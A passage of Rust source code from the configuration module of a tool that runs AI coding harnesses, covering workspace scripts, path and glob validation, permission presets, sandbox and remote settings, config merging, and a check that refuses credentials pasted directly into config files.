                    defaults.join(", ")
                ),
            );
        }
        Ok(())
    }

    /// Whether it runs any command: setup, run scripts or teardown.
    pub fn has_scripts(&self) -> bool {
        !self.setup.is_empty() || !self.teardown.is_empty() || !self.run.is_empty()
    }

    /// The run script `by workspace run` runs for `name`, or, given none,
    /// the default one, or the only one.
    pub fn run_script(&self, name: Option<&str>) -> Result<(String, Vec<String>), String> {
        let names = || self.run.keys().cloned().collect::<Vec<_>>().join(", ");
        let chosen = match name {
            Some(name) => {
                self.run
                    .get_key_value(name)
                    .ok_or_else(|| match self.run.is_empty() {
                        true => "[workspace] has no run scripts".to_owned(),
                        false => format!("no run script named {name}; there are {}", names()),
                    })?
            }
            None => match self.run.iter().find(|(_, r)| r.default) {
                Some(found) => found,
                None if self.run.len() == 1 => self.run.iter().next().expect("one"),
                None if self.run.is_empty() => {
                    return Err("[workspace] has no run scripts".to_owned())
                }
                None => {
                    return Err(format!(
                        "name one of the run scripts ({}), or mark one default = true",
                        names()
                    ))
                }
            },
        };
        Ok((chosen.0.clone(), chosen.1.command.commands()))
    }

    /// What the trust decision is about: SHA-256, in hex, of the section's
    /// canonical form (every list in order, maps sorted). Any change to a
    /// glob or a command changes it.
    pub fn digest(&self) -> String {
        use sha2::{Digest, Sha256};
        let run: BTreeMap<&String, Value> = self
            .run
            .iter()
            .map(|(name, r)| {
                (
                    name,
                    serde_json::json!({ "command": r.command.commands(), "default": r.default }),
                )
            })
            .collect();
        let mut canonical = serde_json::json!({
            "copy": self.copy,
            "setup": self.setup.commands(),
            "run": run,
            "teardown": self.teardown.commands(),
        });
        // Only when used, so a section without them keeps the digest it
        // was trusted with.
        if self.prepare {
            canonical["prepare"] = serde_json::json!({
                "inputs": self.inputs,
                "share": self.share,
            });
        }
        hex::encode(Sha256::digest(canonical.to_string().as_bytes()))
    }
}

/// Why a copy glob is refused, if it is: relative to the repository root,
/// never leaving it, never into `.git` or `.branchyard`.
pub fn check_copy_glob(pattern: &str) -> Result<(), String> {
    if pattern.trim().is_empty() {
        return Err("is empty".into());
    }
    if pattern.starts_with('/') || pattern.starts_with('~') || pattern.starts_with('\\') {
        return Err("must be relative to the repository root".into());
    }
    if pattern.split('/').any(|part| part == "..") {
        return Err("must not leave the repository ('..')".into());
    }
    if pattern
        .split('/')
        .next()
        .is_some_and(|first| first == ".git" || first == ".branchyard")
    {
        return Err("must not reach into .git or .branchyard".into());
    }
    glob::Pattern::new(pattern).map_err(|e| format!("is not a glob: {e}"))?;
    Ok(())
}

/// Why a `share` path is refused, if it is: a literal relative path (no
/// glob) inside the repository, not into `.git` or `.branchyard`.
pub fn check_share_path(path: &str) -> Result<(), String> {
    let trimmed = path.trim_end_matches('/');
    if trimmed.trim().is_empty() {
        return Err("is empty".into());
    }
    if trimmed.starts_with('/') || trimmed.starts_with('~') || trimmed.starts_with('\\') {
        return Err("must be relative to the repository root".into());
    }
    if trimmed.contains(['*', '?', '[', '!']) {
        return Err("must be a literal path, not a glob".into());
    }
    if trimmed
        .split('/')
        .any(|part| part.is_empty() || part == "." || part == "..")
    {
        return Err("must be a plain path inside the repository".into());
    }
    if trimmed
        .split('/')
        .next()
        .is_some_and(|first| first == ".git" || first == ".branchyard")
    {
        return Err("must not reach into .git or .branchyard".into());
    }
    Ok(())
}

fn check_script(script: &Script) -> Result<(), String> {
    for command in script.commands() {
        if command.trim().is_empty() {
            return Err("a command must not be empty".into());
        }
        if command.contains('\0') {
            return Err("a command must not hold a NUL character".into());
        }
    }
    Ok(())
}

/// Where the effective `[workspace]` came from.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, JsonSchema)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum WorkspaceOrigin {
    /// The repository's `branchyard.toml`: runs only once trusted.
    Project,
    /// The user file's `[projects."<root>".workspace]`: yours, trusted.
    User,
}

/// The `[workspace]` that applies to the repository at `root`: the user
/// file's `[projects."<root>".workspace]` when it has one, else the
/// project file's. `root` must be spelled as the user file's keys are
/// (absolute, as [`ProjectConfig::resolve_paths`] leaves them).
pub fn effective_workspace(
    root: &str,
    project: Option<&ProjectConfig>,
    user: Option<&ProjectConfig>,
) -> Option<(WorkspaceConfig, WorkspaceOrigin)> {
    let root = root.trim_end_matches('/');
    let own = user.and_then(|user| {
        user.projects
            .iter()
            .find(|(key, _)| key.trim_end_matches('/') == root)
            .and_then(|(_, o)| o.workspace.clone())
    });
    match own {
        Some(workspace) => Some((workspace, WorkspaceOrigin::User)),
        None => project
            .and_then(|p| p.workspace.clone())
            .map(|w| (w, WorkspaceOrigin::Project)),
    }
}

/// Task defaults.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct Defaults {
    /// Harness or profile ID, such as `claude-code` or `codex`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub harness: Option<String>,
    /// A model name, or a size alias (`small`, `medium`, `large`, `extra-large`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub model: Option<String>,
    /// Reasoning effort: `low`, `medium`, `high`, `xhigh`, or 0-100.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub effort: Option<String>,
    /// The authentication method when the secrets allow several:
    /// `api-key`, `oauth-token`, `auth-file`, `vertex-ai`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub auth: Option<String>,
    /// Stop once the harness's own cost estimate exceeds this many dollars.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 0.0))]
    pub budget_usd: Option<f64>,
    /// Stop after this many turns.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 1))]
    pub max_turns: Option<u32>,
    /// Interrupt a turn after this many minutes.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 0.0))]
    pub max_minutes: Option<f64>,
    /// How tool permission requests are answered: `ask` on the terminal,
    /// `yes` to allow each one, or a preset (`read-only`, `edit-worktree`,
    /// `full`; docs/egress.md#permission-presets). Unset: decided by
    /// whether a terminal is attached.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub permissions: Option<PermissionsMode>,
    /// A scrubbed environment and a private HOME for the harness.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub isolated: Option<bool>,
    /// The check a candidate must pass before merging, such as `cargo test`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub check: Option<String>,
    /// Where the harness runs.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub provider: Option<ProviderKind>,
    /// With `provider = "recipe"`: which `[recipes.NAME]` (docs/recipes.md).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub recipe: Option<String>,
    /// A file of standing instructions for the harness.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub instructions: Option<String>,
}

impl Defaults {
    pub fn is_empty(&self) -> bool {
        self == &Defaults::default()
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "kebab-case")]
pub enum PermissionsMode {
    /// Ask on the terminal for each request (`--ask`).
    Ask,
    /// Allow every request (`--yes`).
    Yes,
    /// The `read-only` preset: read and search; edits, commands and the
    /// web denied (`--permissions read-only`).
    ReadOnly,
    /// The `edit-worktree` preset: read, search and edit files; commands
    /// and the web denied.
    EditWorktree,
    /// The `full` preset: every request allowed, as `yes`.
    Full,
}

impl PermissionsMode {
    pub fn as_str(&self) -> &'static str {
        match self {
            PermissionsMode::Ask => "ask",
            PermissionsMode::Yes => "yes",
            PermissionsMode::ReadOnly => "read-only",
            PermissionsMode::EditWorktree => "edit-worktree",
            PermissionsMode::Full => "full",
        }
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "lowercase")]
pub enum ProviderKind {
    /// A local process in its own worktree (the default).
    Local,
    /// A microVM per turn; needs `[microsandbox]` and a build with the
    /// `microsandbox` feature.
    Microsandbox,
    /// The machine an environment recipe makes (`--provider recipe:NAME`);
    /// `defaults.recipe` names it.
    Recipe,
}

/// A Branchyard server to run commands against.
#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct Remote {
    /// The server's URL, as `--remote`: `http(s)://host:port`,
    /// `unix:/path/to/socket`, or `ssh://[user@]host[:port]/path/to/repo`
    /// for a server `by` starts there (docs/remote-ssh.md).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub url: Option<String>,
    /// A file holding the bearer token, as `--token-file`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub token_file: Option<String>,
    /// Extra CA certificates for `https`, as `--ca-file`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ca_file: Option<String>,
    /// The repository's name on the server, as `--repo`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub repo: Option<String>,
}

impl Remote {
    pub fn is_empty(&self) -> bool {
        self == &Remote::default()
    }
}

#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct Serve {
    /// The server configuration `by serve` reads when given no `--config`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub config: Option<String>,
}

impl Serve {
    pub fn is_empty(&self) -> bool {
        self == &Serve::default()
    }
}

#[derive(Clone, Debug, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct Microsandbox {
    /// OCI image with the harness installed.
    pub image: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 1))]
    pub cpus: Option<u8>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 1))]
    pub memory_mib: Option<u32>,
    /// Variables to copy into the sandbox, by name.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub pass_env: Vec<String>,
    /// Between turns: `"destroy"` the microVM (the default) or `"pause"`
    /// it for the next turn. Pausing needs `live_branch`. See
    /// docs/sandbox-snapshots.md.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(regex(pattern = r"^(pause|destroy)$"))]
    pub keep: Option<String>,
    /// With a kept sandbox, checkpoints that also keep a snapshot (default 3).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub snapshots: Option<u32>,
    /// Kept sandboxes per repository before the least recently used is
    /// destroyed (default 4).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    #[schemars(range(min = 1))]
    pub max_paused: Option<u32>,
    /// Use the SDK's pause, live branching and full snapshots: unqualified
    /// until they pass on a KVM host.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub live_branch: Option<bool>,
}

/// `[notify]`: when a branch asks for permission or asks a question,
/// stalls, fails, is interrupted or finishes.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct Notify {
    /// Notify at all. Unset: yes; `--no-notify` turns it off for one command.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub enabled: Option<bool>,
    /// Also show a desktop notification through `notify-send` (Linux and
    /// other Unix) or `osascript` (macOS). Unset: no.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub desktop: Option<bool>,
    /// What to write to the terminal. Unset: `auto`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub terminal: Option<NotifyTerminal>,
}

impl Notify {
    pub fn is_empty(&self) -> bool {
        self == &Notify::default()
    }
}

/// The terminal side of a notification.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "lowercase")]
pub enum NotifyTerminal {
    /// A bell, and the desktop-notification escape this terminal is known
    /// to take: OSC 777 on foot, urxvt and VTE terminals, OSC 9 elsewhere.
    Auto,
    /// A bell and OSC 9 (iTerm2, WezTerm, kitty, Ghostty, Windows Terminal).
    Osc9,
    /// A bell and OSC 777 (foot, urxvt, VTE terminals such as GNOME Terminal, WezTerm).
    Osc777,
    /// Only a bell.
    Bell,
    /// Nothing on the terminal (the desktop notification, if on, still runs).
    None,
}

/// A refused file: its message names the key, and the line when known.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ConfigError(pub String);

impl fmt::Display for ConfigError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.0)
    }
}

impl std::error::Error for ConfigError {}

/// Read a file's text strictly: its shape, then every value the flags
/// would also check.
pub fn parse(text: &str) -> Result<ProjectConfig, ConfigError> {
    // The message and line only: toml's own rendering quotes the source
    // line, which could be a pasted secret.
    let config: ProjectConfig = toml::from_str(text).map_err(|e| {
        let line = e
            .span()
            .map(|span| text[..span.start.min(text.len())].matches('\n').count() + 1);
        let message = e.message().trim_end().to_owned();
        ConfigError(match line {
            Some(line) => format!("line {line}: {message}"),
            None => message,
        })
    })?;
    config.check()?;
    Ok(config)
}

impl ProjectConfig {
    /// The checks beyond the file's shape, with the flags' own parsers.
    pub fn check(&self) -> Result<(), ConfigError> {
        let fail = |key: &str, why: String| Err(ConfigError(format!("{key}: {why}")));
        if let Some(version) = self.version {
            if version != VERSION {
                return fail(
                    "version",
                    format!("this build reads version {VERSION}, not {version}"),
                );
            }
        }
        let d = &self.defaults;
        if let Some(harness) = &d.harness {
            if branchyard_harness::profiles::default_for(harness).is_none()
                && branchyard_harness::profiles::by_id(harness).is_none()
            {
                return fail(
                    "defaults.harness",
                    format!("{harness:?} is not a harness or profile; see `by harnesses`"),
                );
            }
        }
        if let Some(model) = &d.model {
            if model.trim().is_empty() {
                return fail("defaults.model", "must not be empty".into());
            }
        }
        if let Some(effort) = &d.effort {
            branchyard_provision::Effort::parse(effort)
                .map_err(|e| ConfigError(format!("defaults.effort: {e}")))?;
        }
        if let Some(auth) = &d.auth {
            if !AUTH_METHODS.contains(&auth.as_str()) {
                return fail(
                    "defaults.auth",
                    format!("use one of {}, not {auth:?}", AUTH_METHODS.join(", ")),
                );
            }
        }
        if let Some(usd) = d.budget_usd {
            if !(usd.is_finite() && usd > 0.0) {
                return fail(
                    "defaults.budget_usd",
                    format!("must be a positive number, not {usd}"),
                );
            }
        }
        if d.max_turns == Some(0) {
            return fail("defaults.max_turns", "must be at least 1".into());
        }
        if let Some(minutes) = d.max_minutes {
            if !(minutes.is_finite() && minutes > 0.0) {
                return fail(
                    "defaults.max_minutes",
                    format!("must be a positive number, not {minutes}"),
                );
            }
        }
        if let Some(check) = &d.check {
            if split_words(check)
                .map_err(|e| ConfigError(format!("defaults.check: {e}")))?
                .is_empty()
            {
                return fail("defaults.check", "needs a command".into());
            }
        }
        match (d.provider, &d.recipe) {
            (Some(ProviderKind::Recipe), None) => {
                return fail(
                    "defaults.recipe",
                    "provider = \"recipe\" needs recipe = \"NAME\", naming a [recipes.NAME]".into(),
                )
            }
            (Some(ProviderKind::Recipe), Some(name)) if !valid_recipe_name(name) => {
                return fail("defaults.recipe", format!("{name:?} is not a recipe name"))
            }
            (Some(ProviderKind::Recipe), Some(_)) => {}
            (_, Some(_)) => {
                return fail(
                    "defaults.recipe",
                    "names the recipe for provider = \"recipe\"; set that too".into(),
                )
            }
            _ => {}
        }
        if d.provider == Some(ProviderKind::Microsandbox) && self.microsandbox.is_none() {
            return fail(
                "defaults.provider",
                "microsandbox needs a [microsandbox] table with an image".into(),
            );
        }
        for (name, source) in &self.secrets {
            secret_source(name, source).map_err(|e| ConfigError(format!("secrets.{name}: {e}")))?;
        }
        for (name, command) in &self.mcp {
            branchyard_provision::McpServerSpec::parse(&format!("{name}={command}"))
                .map_err(|e| ConfigError(format!("mcp.{name}: {e}")))?;
        }
        if let Some(url) = &self.remote.url {
            if !["http://", "https://", "ssh://", "unix:/"]
                .iter()
                .any(|scheme| url.starts_with(scheme))
            {
                return fail(
                    "remote.url",
                    format!("must be an http://, https://, ssh:// or unix:/ URL, not {url:?}"),
                );
            }
        }
        for (key, value) in [
            ("remote.token_file", &self.remote.token_file),
            ("remote.ca_file", &self.remote.ca_file),
            ("remote.repo", &self.remote.repo),
            ("serve.config", &self.serve.config),
            ("defaults.instructions", &d.instructions),
        ] {
            if value.as_deref().is_some_and(|v| v.trim().is_empty()) {
                return fail(key, "must not be empty".into());
            }
        }
        if self.notify.enabled == Some(false) && self.notify.desktop == Some(true) {
            return fail(
                "notify.desktop",
                "has no effect while notify.enabled = false; remove one of them".into(),
            );
        }
        if let Some(workspace) = &self.workspace {
            workspace.check("workspace")?;
        }
        for (name, recipe) in &self.recipes {
            recipe.check(name)?;
        }
        for (root, project) in &self.projects {
            if !(root.starts_with('/') || root.starts_with("~/")) {
                return fail(
                    &format!("projects.{root:?}"),
                    "must be a repository root's absolute path".into(),
                );
            }
            if let Some(workspace) = &project.workspace {
                workspace.check(&format!("projects.{root:?}.workspace"))?;
            }
        }
        if self.knowledge.budget_tokens == Some(0) {
            return fail("knowledge.budget_tokens", "must be at least 1".into());
        }
        for trigger in self.knowledge.distill_on.iter().flatten() {
            if !DISTILL_TRIGGERS.contains(&trigger.as_str()) {
                return fail(
                    "knowledge.distill_on",
                    format!("{trigger:?} is not one of {}", DISTILL_TRIGGERS.join(", ")),
                );
            }
        }
        if let Some(distiller) = &self.knowledge.distiller {
            check_harness(&distiller.harness)
                .or_else(|why| fail("knowledge.distiller.harness", why))?;
            check_model_effort(distiller.model.as_deref(), distiller.effort.as_deref())
                .or_else(|(what, why)| fail(&format!("knowledge.distiller.{what}"), why))?;
            check_command(distiller.command.as_deref())
                .or_else(|why| fail("knowledge.distiller.command", why))?;
        }
        for (kind, entry) in &self.fleet {
            if !FLEET_KEYS.contains(&kind.as_str()) {
                return fail(
                    &format!("fleet.{kind}"),
                    format!("is not a task kind; use one of {}", FLEET_KEYS.join(", ")),
                );
            }
            entry.check(&format!("fleet.{kind}"))?;
        }
        for (key, url) in [
            ("connectors.gateway", &self.connectors.gateway),
            (
                "connectors.sandbox_gateway",
                &self.connectors.sandbox_gateway,
            ),
        ] {
            if let Some(url) = url {
                if !(url.starts_with("http://") || url.starts_with("https://")) {
                    return fail(
                        key,
                        format!("must be an http:// or https:// URL, not {url:?}"),
                    );
                }
            }
        }
        for (key, value) in [
            ("connectors.bundles", &self.connectors.bundles),
            ("connectors.anvil", &self.connectors.anvil),
            ("connectors.listen", &self.connectors.listen),
            ("connectors.vault_key", &self.connectors.vault_key),
        ] {
            if value.as_deref().is_some_and(|v| v.trim().is_empty()) {
                return fail(key, "must not be empty".into());
            }
        }
        if let Some(anvil) = &self.connectors.anvil {
            split_words(anvil).map_err(|e| ConfigError(format!("connectors.anvil: {e}")))?;
        }
        self.connectors.grant_entries()?;
        self.network.policy()?;
        if !self.connectors.grants.is_empty() && self.connectors.gateway.is_none() {
            return fail(
                "connectors.grants",
                "grants need a gateway; set connectors.gateway".into(),
            );
        }
        for (key, value) in [
            ("usage.near_percent", self.usage.near_percent),
            ("usage.skip_over", self.usage.skip_over),
        ] {
            if value.is_some_and(|v| !(0.0..=100.0).contains(&v)) {
                return fail(key, "must be a percent, from 0 to 100".into());
            }
        }
        for (name, account) in &self.usage.accounts {
            if !matches!(account.harness.as_str(), "claude-code" | "codex") {
                return fail(
                    &format!("usage.accounts.{name}.harness"),
                    format!("must be claude-code or codex, not {:?}", account.harness),
                );
            }
            if account.dir.trim().is_empty() {
                return fail(
                    &format!("usage.accounts.{name}.dir"),
                    "must not be empty".into(),
                );
            }
        }
        for (name, tracker) in [
            ("linear", &self.trackers.linear),
            ("jira", &self.trackers.jira),
            ("gitlab", &self.trackers.gitlab),
        ] {
            let Some(tracker) = tracker else { continue };
            if let Some(url) = &tracker.url {
                if !(url.starts_with("http://") || url.starts_with("https://")) {
                    return fail(
                        &format!("trackers.{name}.url"),
                        format!("must be an http:// or https:// URL, not {url:?}"),
                    );
                }
            }
            if let Some(tool) = &tracker.gateway_tool {
                if tool.trim().is_empty() {
                    return fail(
                        &format!("trackers.{name}.gateway_tool"),
                        "must not be empty".into(),
                    );
                }
                if self.connectors.gateway.is_none() {
                    return fail(
                        &format!("trackers.{name}.gateway_tool"),
                        "needs a gateway; set connectors.gateway".into(),
                    );
                }
            }
        }
        if let Some(sandbox) = &self.microsandbox {
            if sandbox.image.trim().is_empty() {
                return fail("microsandbox.image", "must not be empty".into());
            }
            for name in &sandbox.pass_env {
                branchyard_provision::check_variable_name(name)
                    .map_err(|why| ConfigError(format!("microsandbox.pass_env: {name:?} {why}")))?;
            }
            if let Some(keep) = sandbox
                .keep
                .as_deref()
                .filter(|k| !matches!(*k, "pause" | "destroy"))
            {
                return fail(
                    "microsandbox.keep",
                    format!("{keep:?} is not \"pause\" or \"destroy\""),
                );
            }
            if sandbox.max_paused == Some(0) {
                return fail("microsandbox.max_paused", "must be at least 1".into());
            }
        }
        Ok(())
    }

    /// The checks only one kind of file takes: `[workspace]` belongs in a
    /// repository's `branchyard.toml`, `[projects]` in the user file.
    pub fn check_layer(&self, layer: Layer) -> Result<(), ConfigError> {
        match layer {
            Layer::User if self.workspace.is_some() => Err(ConfigError(
                "workspace: [workspace] belongs in a repository's branchyard.toml; for one \
                 repository of your own, use [projects.\"/path/to/repo\".workspace] here"
                    .into(),
            )),
            Layer::Project if !self.projects.is_empty() => Err(ConfigError(
                "projects: [projects] belongs in your user configuration \
                 (~/.config/branchyard/config.toml), not in a repository"
                    .into(),
            )),
            _ => Ok(()),
        }
    }

    /// Paths made absolute against `dir`, the directory of the file they
    /// came from, and `~/` against `home`.
    pub fn resolve_paths(&mut self, dir: &Path, home: Option<&Path>) {
        let resolve = |value: &mut Option<String>| {
            if let Some(path) = value {
                *path = resolve_path(path, dir, home).display().to_string();
            }
        };
        resolve(&mut self.remote.token_file);
        resolve(&mut self.remote.ca_file);
        resolve(&mut self.serve.config);
        resolve(&mut self.defaults.instructions);
        resolve(&mut self.connectors.bundles);
        resolve(&mut self.connectors.vault_key);
        for source in self.secrets.values_mut() {
            if let Some(path) = source.strip_prefix('@') {
                *source = format!("@{}", resolve_path(path, dir, home).display());
            }
        }
        self.projects = std::mem::take(&mut self.projects)
            .into_iter()
            .map(|(root, project)| {
                (
                    resolve_path(&root, dir, home).display().to_string(),
                    project,
                )
            })
            .collect();
    }

    /// Every set value by its dotted key, such as `defaults.harness` or
    /// `secrets.ANTHROPIC_API_KEY`.
    pub fn flatten(&self) -> BTreeMap<String, Value> {
        let mut flat = BTreeMap::new();
        if let Ok(Value::Object(map)) = serde_json::to_value(self) {
            flatten_into("", &map, &mut flat);
        }
        flat
    }

    /// The inverse of [`ProjectConfig::flatten`].
    pub fn unflatten(flat: &BTreeMap<String, Value>) -> Result<ProjectConfig, ConfigError> {
        let mut root = Map::new();
        for (key, value) in flat {
            let (table, leaf) = match key.split_once('.') {
                Some((table, leaf)) => (table, Some(leaf)),
                None => (key.as_str(), None),
            };
            match leaf {
                None => {
                    root.insert(table.to_owned(), value.clone());
                }
                Some(leaf) => {
                    let entry = root
                        .entry(table.to_owned())
                        .or_insert_with(|| Value::Object(Map::new()));
                    if let Value::Object(map) = entry {
                        map.insert(leaf.to_owned(), value.clone());
                    }
                }
            }
        }
        serde_json::from_value(Value::Object(root)).map_err(|e| ConfigError(e.to_string()))
    }

    /// The secrets as the flags' `NAME=VAR` or `NAME=@FILE` sources.
    pub fn secret_sources(&self) -> Result<Vec<branchyard_provision::SecretSource>, ConfigError> {
        self.secrets
            .iter()
            .map(|(name, source)| {
                secret_source(name, source).map_err(|e| ConfigError(format!("secrets.{name}: {e}")))
            })
            .collect()
    }
}

/// Where a layer's values came from.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, JsonSchema)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum Source {
    /// The user file.
    User { path: String },
    /// The project file.
    Project { path: String },
    /// A `BRANCHYARD_*` variable.
    Env { var: String },
}

impl fmt::Display for Source {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Source::User { path } => write!(f, "user {path}"),
            Source::Project { path } => write!(f, "project {path}"),
            Source::Env { var } => write!(f, "env {var}"),
        }
    }
}

/// The merged configuration, and where each value came from.
#[derive(Clone, Debug, Default, PartialEq)]
pub struct Effective {
    pub config: ProjectConfig,
    pub sources: BTreeMap<String, Source>,
}

/// The variables that override `[remote]`, by key.
pub const REMOTE_VARIABLES: &[(&str, &str)] = &[
    ("remote.url", "BRANCHYARD_REMOTE"),
    ("remote.token_file", "BRANCHYARD_TOKEN_FILE"),
    ("remote.repo", "BRANCHYARD_REPO"),
    ("remote.ca_file", "BRANCHYARD_CA_FILE"),
];

/// Merge layers, later ones winning key by key, then the variables `env`
/// returns (only [`REMOTE_VARIABLES`] are asked for).
pub fn merge(
    layers: &[(Source, ProjectConfig)],
    env: impl Fn(&str) -> Option<String>,
) -> Result<Effective, ConfigError> {
    let mut flat = BTreeMap::new();
    let mut sources = BTreeMap::new();
    for (source, layer) in layers {
        for (key, value) in layer.flatten() {
            flat.insert(key.clone(), value);
            sources.insert(key, source.clone());
        }
    }
    for (key, var) in REMOTE_VARIABLES {
        if let Some(value) = env(var).filter(|v| !v.trim().is_empty()) {
            flat.insert((*key).to_owned(), Value::String(value));
            sources.insert(
                (*key).to_owned(),
                Source::Env {
                    var: (*var).to_owned(),
                },
            );
        }
    }
    Ok(Effective {
        config: ProjectConfig::unflatten(&flat)?,
        sources,
    })
}

/// The methods `--auth` takes.
pub const AUTH_METHODS: &[&str] = &["api-key", "oauth-token", "auth-file", "vertex-ai"];

/// `NAME` with its `VAR` or `@FILE` source, parsed as `--secret` does,
/// after [`check_secret_reference`]. No error quotes the source.
pub fn secret_source(
    name: &str,
    source: &str,
) -> Result<branchyard_provision::SecretSource, String> {
    branchyard_provision::check_variable_name(name).map_err(|why| format!("secret name {why}"))?;
    check_secret_reference(source)?;
    branchyard_provision::SecretSource::parse(&format!("{name}={source}"))
        .map_err(|_| "is not a variable name or @file".to_owned())
}

/// Whether `source` names where a secret is (a variable, `VAR`, or a file,
/// `@path`) rather than being one. Refuses what looks like a pasted
/// credential; the message never quotes it.
pub fn check_secret_reference(source: &str) -> Result<(), String> {
    const REFUSED: &str = "must name a variable (such as ANTHROPIC_API_KEY) or a file (@path) \
                           that holds the secret, never the secret itself; the value is not shown";
    if let Some(path) = source.strip_prefix('@') {
        return match path.trim().is_empty() {
            true => Err("names an empty file after '@'".into()),
            false => Ok(()),
        };
    }
    let name_like = !source.is_empty()
        && source.len() <= 64
        && source.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
        && source
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_');
    let lower = source.to_ascii_lowercase();
    let credential_like = [
        "sk-",
        "sk_",
        "ghp_",
        "gho_",
        "ghs_",
        "github_pat_",
        "xox",
        "akia",
        "aiza",
        "glpat-",
    ]
    .iter()
    .any(|prefix| lower.starts_with(prefix))
        || (source.len() >= 24
            && source.chars().any(|c| c.is_ascii_lowercase())
            && source.chars().any(|c| c.is_ascii_uppercase())
            && source.chars().any(|c| c.is_ascii_digit()));
    match name_like && !credential_like {
        true => Ok(()),
        false => Err(REFUSED.into()),
    }
}

fn resolve_path(path: &str, dir: &Path, home: Option<&Path>) -> PathBuf {
    if let (Some(rest), Some(home)) = (path.strip_prefix("~/"), home) {
        return home.join(rest);
    }
    let path = PathBuf::from(path);
    match path.is_absolute() {
        true => path,
        false => dir.join(path),
    }
}

fn flatten_into(prefix: &str, map: &Map<String, Value>, flat: &mut BTreeMap<String, Value>) {
    for (key, value) in map {
        let key = match prefix.is_empty() {
            true => key.clone(),
            false => format!("{prefix}.{key}"),
        };
        match value {
            // One level of tables: `[defaults]`, `[secrets]`, ...; a
            // table's own values (`microsandbox.pass_env`) stay whole.
            Value::Object(inner) if prefix.is_empty() => flatten_into(&key, inner, flat),
            Value::Null => {}
            other => {
                flat.insert(key, other.clone());
            }
        }
    }
}

/// Split a command line like a shell does for `--check`: whitespace,
/// single and double quotes, backslash escapes.
pub fn split_words(line: &str) -> Result<Vec<String>, String> {
    let mut words = Vec::new();
    let mut word = String::new();
    let mut in_word = false;
    let mut chars = line.chars();
    while let Some(c) = chars.next() {
        match c {
            '\'' => {
                in_word = true;
                loop {
                    match chars.next() {
                        Some('\'') => break,
                        Some(c) => word.push(c),
                        None => return Err("unterminated single quote".into()),
                    }
                }
            }
            '"' => {
                in_word = true;
                loop {
                    match chars.next() {
                        Some('"') => break,
                        Some('\\') => match chars.next() {
                            Some(c) => word.push(c),
                            None => return Err("unterminated double quote".into()),
                        },
                        Some(c) => word.push(c),
                        None => return Err("unterminated double quote".into()),
                    }
                }
            }
            '\\' => {
                in_word = true;
                match chars.next() {
                    Some(c) => word.push(c),
                    None => return Err("trailing backslash".into()),
                }
            }
            c if c.is_whitespace() => {
                if in_word {
                    words.push(std::mem::take(&mut word));
                    in_word = false;
                }
            }
            c => {
                in_word = true;
                word.push(c);
            }
        }
    }
    if in_word {
        words.push(word);
    }
    Ok(words)
}

/// A TOML string literal.
pub fn toml_string(text: &str) -> String {
    toml::Value::String(text.to_owned()).to_string()
}

/// A number as TOML writes it: integers without a fraction.
pub fn toml_number(value: f64) -> String {
    if value.fract() == 0.0 && value.abs() < 1e15 {
        format!("{}", value as i64)
    } else {
        format!("{value}")
    }
}

/// Render a configuration as a commented file, with the `#:schema` hint
/// editors (taplo, Even Better TOML) use for completion. Parsing the result
/// gives `config` back.
pub fn render(config: &ProjectConfig, heading: &str) -> String {
    let mut out = String::new();
    out.push_str(&format!("#:schema {SCHEMA_URL}\n"));
    for line in heading.lines() {
        out.push_str(format!("# {line}").trim_end());
        out.push('\n');
    }
    out.push_str("# Every key: docs/setup.md#configuration. Check with `by config validate`.\n");
    out.push_str(&format!(
        "version = {}\n",
        config.version.unwrap_or(VERSION)
